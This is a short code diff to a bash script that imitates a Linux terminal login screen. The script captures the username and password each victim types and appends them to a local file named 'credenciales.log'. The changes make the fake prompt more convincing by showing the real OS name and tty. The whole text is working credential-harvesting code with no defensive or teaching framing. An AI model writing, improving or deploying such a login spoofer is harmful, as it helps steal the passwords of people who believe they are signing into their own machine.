@@ -2,16 +2,24 @@
 
 LOGS="credenciales.log"
 INTENTOS=3
-TTY_NUM=$(tty | cut -d'/' -f4)
 
 clear
+
+if command -v lsb_release &> /dev/null; then
+    OS_NAME=$(lsb_release -d | cut -f2)
+else
+    OS_NAME=$(uname -s)
+fi
+
+TTY=$(tty | sed 's/\/dev\///')
+
 for ((i=1; i<=INTENTOS; i++)); do
-    echo -e "\n\033[1mLinux localhost $TTY_NUM\033[0m"
-    read -p "login: " username
-    read -s -p "Password: " password
+    echo -e "$OS_NAME $TTY\n"
+    read -p "$OSTYPE login: " usuario
+    read -s -p "password: " contrasena
     echo
 
-    echo "$(date '+%Y-%m-%d %H:%M:%S') - Usuario: $username, Password: $password" >> "$LOGS"
+    echo "$(date '+%Y-%m-%d %H:%M:%S') - Usuario: $usuario, Password: $contrasena" >> "$LOGS"
 
     sleep 2
     
